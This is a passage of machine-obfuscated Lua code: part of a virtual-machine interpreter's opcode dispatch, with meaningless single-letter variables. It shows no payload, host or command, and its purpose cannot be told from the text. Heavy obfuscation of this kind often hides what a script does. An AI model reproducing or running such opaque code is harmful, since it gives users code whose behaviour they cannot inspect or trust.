A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];end;elseif c<=204 then d=d+o[3];elseif c>205 then e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];if e[o[2]]then d=d+1;else d=d+o[3];end;else e[o[2]]={unpack({},1,o[3])};end;elseif c<=227 then if c<=216 then if c<=211 then if c<=208 then if c==207 then e[o[2]][n[o[3]]]=n[o[5]];else e[o[2]][n[o[3]]]=e[o[5]];end;elseif c<=209 then e[o[2]]=e[o[3]];elseif c>210 then if(n[o[2]]<=e[o[5]])then d=d+1;else d=d+o[3];end;else local D;local S,f;local f;local c;local a;local A;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];A=o[2];a={};c=0;f=A+o[3]-1;for o=A+1,f do c=c+1;a[c]=e[o];end;S,f=J(e[A](r(a,1,f-A)));f=f+A-1;c=0;for o=A,f do c=c+1;e[o]=S[c];end;B=f;d=d+1;o=l[d];A=o[2];a={};f=B;for o=A+1,f do a[#a+1]=e[o];end;do return e[A](r(a,1,f-A))end;d=d+1;o=l[d];A=o[2];f=B;D={};c=0;for o=A,f do c=c+1;D[c]=e[o];end;do return r(D,1,c)end;d=d+1;o=l[d];do return end;end;elseif c<=213 then if c>212 then e[o[2]]=e[o[3]]%e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];else if(e[o[2]]<=e[o[5]])then d=d+1;else d=d+o[3];end;end;elseif c<=214 then local J;local D;local a;local c;local C;local A;A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];J=e[o[3]];e[A+1]=J;e[A]=J[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];elseif c>215 then local f;local C,f;local A;local f;local a;local c;e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];a={};f=0;A=c+o[3]-1;for o=c+1,A do f=f+1;a[f]=e[o];end;C,A=J(e[c](r(a,1,A-c)));A=A+c-1;f=0;for o=c,A do f=f+1;e[o]=C[f];end;B=A;d=d+1;o=l[d];c=o[2];a={};f=0;A=B;for o=c+1,A do f=f+1;a[f]=e[o];end;C={e[c](r(a,1,A-c))};A=c+o[5]-2;f=0;for o=c,A do f=f+1;e[o]=C[f];end;B=A;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];d=d+o[3];else local A;local D,A;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D,a=J(e[c](r(C,1,a-c)));a=a+c-1;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];c=o[2];C={};A=0;a=B;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];end;elseif c<=221 then if c<=218 then if c==217 then local A;local D,A;local c;local A;local C;local a;e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];a=o[2];C={};A=0;c=a+o[3]-1;for o=a+1,c do A=A+1;C[A]=e[o];end;D,c=J(e[a](r(C,1,c-a)));c=c+a-1;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];a=o[2];C={};A=0;c=B;for o=a+1,c do A=A+1;C[A]=e[o];end;D={e[a](r(C,1,c-a))};c=a+o[5]-2;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];else local J;local a;local c;local C;local D;local A;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]();B=A;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];end;elseif c<=219 then local o=o[2];do return e[o]();end;elseif c>220 then if(e[o[2]]~=e[o[5]])then d=d+1;else d=d+o[3];end;else local d=o[2];local n=d+o[3]-2;local l={};local o=0;for d=d,n do o=o+1;l[o]=e[d];end;do return r(l,1,o)end;end;elseif c<=224 then if c<=222 then e[o[2]]=e[o[3]]*n[o[5]];elseif c>223 then local D;local a;local A;local C;local c;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-n[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];else local D;local a;local A;local C;local c;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];end;elseif c<=225 then local D;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do 